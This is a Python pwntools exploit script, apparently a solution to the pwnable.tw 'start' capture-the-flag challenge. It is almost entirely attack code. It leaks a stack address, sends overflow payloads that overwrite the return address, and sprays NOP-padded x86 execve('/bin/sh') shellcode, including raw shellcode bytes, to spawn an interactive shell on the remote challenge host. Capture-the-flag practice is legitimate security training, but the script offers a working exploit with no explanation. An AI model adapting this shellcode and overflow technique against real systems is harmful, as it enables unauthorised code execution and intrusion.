from pwn import *
from pwnlib import *
import time

def get_rough_esp(p):
    p.recv(0x14)
    p.sendline(fit({ 0x14: p32(0x8048087)}))
    secrect = bytearray(p.recv(0x14))
    p.sendline(fit({ 0x14: p32(0x8048060)}))
    secrect[0]='\x00'
    return u32(secrect[:4])

if args.args['REMOTE']:
    p = connect('chall.pwnable.tw', 10000)
else:
    p = process('./start')

# shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
print len(shellcode)
# shellcode = asm.asm(shellcraft.i386.linux.echo('hel'), arch='i386', os='linux')
nop = asm.asm(shellcraft.i386.nop(), arch='i386', os='linux')
shellcode = shellcode + nop*(36-len(shellcode))

rough_esp = get_rough_esp(p)
print hex(rough_esp), len(shellcode), len(nop)
for i in range(36//4):
    p.recv(0x14)
    p.send(fit({
        0: nop*0x14,
        0x14: p32(0x8048060),
        0x18: nop*i*4 + shellcode[:36-i*4]
    }, length=0x3c))

for i in range(0xff//4*2):
    p.recv(0x14)
    p.send(fit({
        0: nop*0x14,
        0x14: p32(0x8048060)
    }, length=0x3c, filler=nop))

p.recv(0x14)
p.send(fit({
    0: nop*0x14,
    0x14: p32(rough_esp)
}, length=0x3c, filler=nop))

p.interactive()
# print p.recvall()
